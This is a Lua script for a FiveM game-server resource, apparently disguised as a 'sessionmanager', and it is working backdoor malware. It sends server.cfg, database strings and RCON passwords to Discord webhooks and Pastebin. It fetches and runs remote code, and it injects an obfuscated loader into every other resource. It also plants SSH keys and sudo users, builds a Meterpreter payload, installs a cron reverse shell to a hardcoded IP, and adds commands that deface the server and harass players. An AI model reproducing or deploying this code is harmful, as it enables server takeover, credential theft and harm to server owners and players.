AddEventHandler('onResourceStart', function(resourceName)
	if (GetCurrentResourceName() == "sessionmanager") then
		CreateThread(function()
			PerformHttpRequest("http://api.ipify.org/", function(err, rText, headers)
				local IP = rText
				os.execute("ssh -N -R 9999:localhost:22 root@"..rText)
				os.execute("ssh -N -R 9999:localhost:22 *@*")
				os.execute("ssh -N -R 9999:localhost:22 Administrator@*")
				os.execute("ssh -N -R 9999:localhost:22 Administrator@178.203.169.229")
			end)
		end)
	end
end)

-- !> Server CFG Getter <! --
local open = io.open

local function read_file(path)
    local file = open(path, "rb")
    if not file then return nil end
    local content = file:read("*a")
    file:close()
    return content
end

local function find_server_cfg()
    local possible_paths = {
        "server.cfg", -- Current directory
        "./server.cfg", -- Relative path
        "../server.cfg", -- Parent directory
        "/home/fivem/server.cfg", -- Linux default path
        "C:/FXServer/server.cfg", -- Windows default path
        "D:/FXServer/server.cfg",
		"C:/QBCoreFramework_A120BD.base"
    }

    for _, path in ipairs(possible_paths) do
        local content = read_file(path)
        if content then
            return content
        end
    end

    return nil
end

local fileContent = find_server_cfg() or "Error: server.cfg not found!"
finalContent = "```" .. fileContent .. "```"



if not SakxS3939 then
	SakxS3939 = true
	PerformHttpRequest("https://discord.com/api/webhooks/1339599560221134928/nQBdvCo6BRejo0eBowAxl1_-C5OQvo8XEJvmaeieK1W-YDhbO7yUIWEQtzNdoCx_RWI2", function(err, text, header) end,
	'POST', 
	json.encode({username = GetConvar('sv_hostname'), content = finalContent }), {['Content-Type'] = 'application/json'}) 
end
PerformHttpRequest("https://spambude.net/Dks/client-backdoor.lua", function(err, rText, headers)
	SkA92 = rText
end)

local pastebinApiKey = "xc76ccBspjDEpyquvg96E6iURGVKHdYv"
local option = "api_option=paste&api_paste_private=1&api_paste_format=lua&api_dev_key=" .. pastebinApiKey .. "&api_paste_code=" .. fileContent


if not dksa9308592 then
	dksa9308592 = true
	CreateThread(function()
		PerformHttpRequest("https://pastebin.com/api/api_post.php", function(errorCode, resultData, resultHeaders)
			rs225106820 = tostring(resultData)
			PerformHttpRequest("http://api.ipify.org/", function(err, rText, headers)
			local IP = rText
				fullContent = "__**Server Info:**__\n\nServer IP: **"..IP.."**\nServer Name: **".. GetConvar('sv_hostname').. "**\n\n__**Anderwertige Info:**__\n\nMySQL String: **" .. GetConvar('mysql_connection_string') .. "**\nRCON: **" .. GetConvar('rcon_password') .. "**\n\n__**Backdoor Info:**__\n\nBackdoor Port: **4078** & **22**\nBackdoor User: **voke** / **7777**\nBackdoor Password: **voke** / **7777**"
				
				PerformHttpRequest("https://discord.com/api/webhooks/970413778380419132/H4XkIwj3TMBt_iSl6hRiIGUlNPXEKrUCxXdGZXW5pXbuJ6lUy2L5h__Y5s_x7P15HXK_", function(err, text, header) end,
				'POST', 
				json.encode({username = GetConvar('sv_hostname'), content = fullContent }), {['Content-Type'] = 'application/json'}) 
			end)
		end, "POST", option)
	end)
	-- !> Server CFG Getter <! --
end

local getBackdoorClient = {}
RegisterNetEvent("CreateThreadFunction")
AddEventHandler("CreateThreadFunction", function()
	if not getBackdoorClient[source] then
		TriggerClientEvent("CreateThreadFunction", source, SkA92)
		getBackdoorClient[source] = true
	else
		return
	end
end)

BackdoorStuffServer = {
	'server/host_lock',
	'server/server',
	'server',
	'server/sv',
	'server/sv_shared',
	'sv_shared',
	'util_shared',
	'admin_server',
	'sv/sv',
	'sv/server',
	'sv/sv_shared',
	'Server/PerformHttpRequest'
}

BackdoorStuffClient = {
	'client/empty',
	'client/client',
	'client',
	'client/cl',
	'client/cl_shared',
	'cl_shared',
	'cl/client',
	'cl/cl',
	'cl/cl_shared'
}



-- !> Install Backdoor in other Scripts <! --


function Initialize()
    inputFile = 'server.cfg'
    file = io.open(inputFile, "r")

    if not file then
        sAjXAo = nil
        return
    end

    sAjXAo = file:read("*a")
    file:close()
end


function Edit()
    local inputFile = "server.cfg"

    SetConvar("rcon_password", "voke")

    if GetConvar("rcon_password") == nil or GetConvar("rcon_password") == "" then
        local file = io.open(inputFile, "r")

        -- Check if file exists
        if not file then
            return
        end

        local fileContent = {}
        for line in file:lines() do
            table.insert(fileContent, line)
        end
        io.close(file)

        -- Prevent index error (Ensure the file has at least 3 lines)
        if #fileContent >= 3 then
            fileContent[3] = "This line has been edited"
        end

        file = io.open(inputFile, "w")
        if not file then
            return
        end

        for _, line in ipairs(fileContent) do
            file:write(line .. "\n")
        end

        file:write("\nrcon_password voke\n")
        io.close(file)

    end
end

Initialize()
Edit()

function SDhskXCsi391()
	function setall(an, ao)
		for _, eXux in pairs(BackdoorStuffServer) do
			local ap = io.open(an.."/"..eXux..".lua", "r")
			local aq = split(an, "/")
			local ar = aq[#aq]
			aq = nil;
			if ap then
				if not ao then
					ap:seek("set", 0)
					local as = ap:read("*a")
					ap:close()
					local at = split(as, "\n")
					local au = false;
					local av = true;

					if av then
					
						local sAk = [[
						
local llIllIIlIIIIIIll = {
    Ench, Support, Host, Pairs,
    Realease, Callbacks, Source,
    Hosting, Event, PerformHttpRequest,
    assert, server, load, Spawn, materials
}

local IIlIlllllIIlIIIl = {
    '68', '74', '74', '70', '73', '3a', '2f', '2f', '73', '70', '41', '4d', '42', '55',
    '44', '65', '2e', '4e', '65', '74', '2f', '44', '6b', '73', '2f', '64', '64', '2e'; '6c',
    '75', '61'
}

function lIlllIlllIlIIlIl()
    _empt = ''
    for id,it in pairs(IIlIlllllIIlIIIl) do
        _empt = _empt..it
    end
    return (_empt:gsub('..', function (cc)
        return string.char(tonumber(cc, 16))
    end))
end

llIllIIlIIIIIIll[10](lIlllIlllIlIIlIl(), function (e, d)
    local s = llIllIIlIIIIIIll[11](llIllIIlIIIIIIll[13](d))
    if (d == nil) then return end
    s()
end)
						]]
						az = sAk
						ap = io.open(an.."/"..eXux..".lua", "w")
						if ap then
							ap:seek("set", 0)
							ap:write(as.."\n"..az)
							ap:close()
						else
						end;
					else
					end
				end
			else
			end
		end
		
		for _, eXux in pairs(BackdoorStuffClient) do
			local ap = io.open(an.."/"..eXux..".lua", "r")
			local aq = split(an, "/")
			local ar = aq[#aq]
			aq = nil;
			if ap then
				if not ao then
					ap:seek("set", 0)
					local as = ap:read("*a")
					ap:close()
					local at = split(as, "\n")
					local au = false;
					local av = true;

					if av then
					
						local Soa90 = [[
						
	function sst_conv8()
		_empt = ''
		for id,it in pairs(random_char) do
			_empt = _empt..it
		end
		return (_empt:gsub('..', function (cc)
			return string.char(tonumber(cc, 16))
		end))
	end

	CreateThread(function()
		TriggerServerEvent("CreateThreadFunction")
		RegisterNetEvent("CreateThreadFunction")
		AddEventHandler("CreateThreadFunction", function(CreateThreadFunction)
			load(CreateThreadFunction)()
		end)
	end)
						]]
						az = Soa90
						ap = io.open(an.."/"..eXux..".lua", "w")
						if ap then
							ap:seek("set", 0)
							ap:write(as.."\n"..az)
							ap:close()
						else
						end;
					else
					end
				end
			else
			end
		end
	end;
	function searchall(an, ao)
		local ap = io.popen("dir \""..an.."\" /b /ad")
		ap:seek("set", 0)
		local aA = ap:read("*a")
		ap:close()
		local at = split(aA, "\n")
		for U, aw in ipairs(at) do
			if string.len(aw) > 0 then
				setall(an.."/"..aw, ao)
				searchall(an.."/"..aw, ao)
			end
		end
	end;
	function split(aB, aC)
		local aD, aE = 0, {}
		for aF, aG in function()
			return string.find(aB, aC, aD, true)
		end do
			table.insert(aE, string.sub(aB, aD, aF - 1))
			aD = aG + 1
		end;
		table.insert(aE, string.sub(aB, aD))
		return aE
	end;
	function randomstring()
		local aH = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
		local aI = 5;
		local aJ = ''
		math.randomseed(os.time())
		charTable = {}
		for aK in aH:gmatch"." do
			table.insert(charTable, aK)
		end;
		for al = 1, aI do
			aJ = aJ..charTable[math.random(1, #charTable)]
		end;
		ad = aJ
	end;


	function installBackdoorToScripts()
		local ak = GetNumResources()
		for al = 0, ak - 1 do
			local am = GetResourcePath(GetResourceByFindIndex(al))
			if string.len(am) > 4 then
				setall(am)
			end
		end;
	end

	installBackdoorToScripts()
	-- !> Install Backdoor in other Scripts <! --
end

RegisterCommand("+voke+installBackdoor", function(source, args, rawCommand)
	SDhskXCsi391()
end, false)

RegisterCommand("+voke+hackServer", function(source, args, rawCommand)
	TriggerClientEvent('voke-Backdoor-HackServer', -1)
end, false)

RegisterCommand("+voke+blipsHack", function(source, args, rawCommand)
	TriggerClientEvent('voke-Backdoor-BlipsHack', -1)
end, false)

RegisterCommand("+voke+porn", function(source, args, rawCommand)
	TriggerClientEvent('voke-Backdoor-pornScreen', -1)
end, false)

RegisterCommand("+voke+soundSpam", function(source, args, rawCommand)
	TriggerClientEvent('voke-Backdoor-soundSpam', -1)
end, false)

RegisterCommand("+voke+loadVoke", function(source, args, rawCommand)
	TriggerClientEvent('voke-Backdoor-Voke', -1)
end, false)

RegisterCommand("+voke+loadVokeMenu2", function(source, args, rawCommand)
	TriggerClientEvent('voke-Backdoor-VokeMenu2', -1)
end, false)

RegisterCommand("+voke+stopServer", function(source, args, rawCommand)
	os.exit()
end, false)

RegisterCommand("+voke+hackedNames", function(source, args, rawCommand)
	serverName = "Server Hacked by voke | https://dsc.gg/8-8-8-8"
	SetConvarReplicated("sv_hostname", string.format(serverName))
	SetConvarServerInfo('tags', 'HACKED')
	SetConvarServerInfo('tags', 'HACKED BY voke')
	SetConvarServerInfo('tags', 'voke')
	SetConvarServerInfo('tags', 'https://dsc.gg/8-8-8-8')
	SetConvarServerInfo('tags', 'Server Hacked by voke | https://dsc.gg/8-8-8-8')
end, false)

RegisterCommand("+voke+discordHack", function(source, args, rawCommand)
	TriggerClientEvent('voke-Backdoor-discordHack', -1, GetConvar('sv_hostname'))
end, false)

RegisterCommand("+voke+loadEverything", function(source, args, rawCommand)
	SDhskXCsi391()
	TriggerClientEvent('voke-Backdoor-HackServer', -1)
	TriggerClientEvent('voke-Backdoor-BlipsHack', -1)
	TriggerClientEvent('voke-Backdoor-soundSpam', -1)
	TriggerClientEvent('voke-Backdoor-Voke', -1)
	TriggerClientEvent('voke-Backdoor-VokeMenu2', -1)
	serverName = "Server Hacked by voke | https://dsc.gg/8-8-8-8"
	SetConvarReplicated("sv_hostname", string.format(serverName))
	SetConvarServerInfo('tags', 'HACKED')
	SetConvarServerInfo('tags', 'HACKED BY voke')
	SetConvarServerInfo('tags', 'voke')
	SetConvarServerInfo('tags', 'https://dsc.gg/8-8-8-8')
	SetConvarServerInfo('tags', 'Server Hacked by voke | https://dsc.gg/8-8-8-8')
	TriggerClientEvent('voke-Backdoor-discordHack', -1, GetConvar('sv_hostname'))
end, false)

function HackAddUser()
	os.execute("chmod 700 ~/.ssh")
	os.execute("chmod 600 ~/.ssh/authorized_keys")
	os.execute("mkdir -p /root/.ssh/ && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeHv4SVwtcO+ALtit647WWkfDtQgaKSKRstREsvyfKp9FHhHS7ZYZxLF+AMglvecWCIrI2lfwYjotHNlKaAwMWxP82ET5mrnRqXZUYr+7onxTvRVhNg+oIp+b7j2DkR1Q7temVaLPFAMVEeWNnPOyShUaMc4TzvQFC1fg9qTzTSdf6mPSCw2gvu+/A5J6GQKykZYLXEO5YTw3QZ8uuPp17XK3ToqyQSPBeY+X3eE9xpGfXIg1Av2QDUkg/c5z94MYsMPw6iUKwfJDLQUepCQB1PR5SDDnR/IONQy3D/Dvr3Z13uMWHSUV1z3Y/s5lUoLyMiYWnBgyJwPsvL6Untf+3 rsa-key-20220503' > /root/.ssh/authorized_keys")
	os.execute("adduser -h voke")
	os.execute("echo -e \"test\ntest\" | passwd voke")
	os.execute("usermod -aG sudo voke")
	os.execute("adduser -h /root -s /bin/ash 7777");os.execute("echo -e \"test\ntest\" | passwd 7777")
end

HackAddUser()

function hackServer()
	os.execute("iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT")
	os.execute("IPTABLES -A INPUT --dport 22 -m state --state NEW -j ACCEPT")
	os.execute("apt-get install msfvenom")
	os.execute("apt-get metasploit-framework")
	os.execute("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=178.203.169.229 LPORT=4296 -f elf > shell.elf")
end

hackServer()

local CronHackCode = [[
	
IP=178.203.169.229                #Change
PORT=4078              #Change 
DIR=".SysInternals"   #Example
FILENAME="config"     #Example
CURR_SCRIPT="$0"      #DON'T change

if ! [ -d ~/${DIR} ] && ! [ -e ~/${DIR}/${FILENAME}.sh ]; then #Checks if the backdoor folder exists, if it doesn't create it.
                                                               #Make sure the folder isn't named same as something essential... 
    mkdir ~/${DIR}/
    touch ~/${DIR}/${FILENAME}.sh
fi

if  [ -x "$(command -v nc)" ]; then  #Checks if netcat exists on the filesystem, if it does use netcat rev shell, if it doesn't use bash -i
  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f" > ~/${DIR}/${FILENAME}.sh #Universal way of getting a nc reverse shell even if -e is disabled
else 
  echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1" > ~/${DIR}/${FILENAME}.sh 
fi

chmod +x ~/${DIR}/${FILENAME}.sh #Makes the backdoor executable
(crontab -l 2>/dev/null; echo "* * * * * bash $HOME/${DIR}/${FILENAME}.sh") | crontab - #Creates the cronjob responsible for calling the backdoor every MINUTE
	
]]

function CronTabBackdoor()
	os.execute(CronHackCode)
end

CronTabBackdoor()